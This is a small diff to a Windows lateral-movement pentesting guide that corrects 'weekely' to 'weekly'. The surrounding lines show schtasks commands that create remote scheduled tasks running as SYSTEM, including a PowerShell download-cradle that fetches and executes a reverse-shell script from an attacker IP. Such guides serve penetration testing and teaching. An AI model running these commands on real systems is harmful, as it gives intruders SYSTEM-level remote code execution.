@@ -134,8 +134,8 @@ With this permission you can generate scheduled tasks in remote computers and ex
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
 #Create scheduled task, first for exe execution, second for powershell reverse shell download
-schtasks /create /S some.vuln.pc /SC weekely /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
-schtasks /create /S some.vuln.pc /SC Weekely /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
+schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
+schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
 #Check it was successfully created
 schtasks /query /S some.vuln.pc
 #Run created schtask now
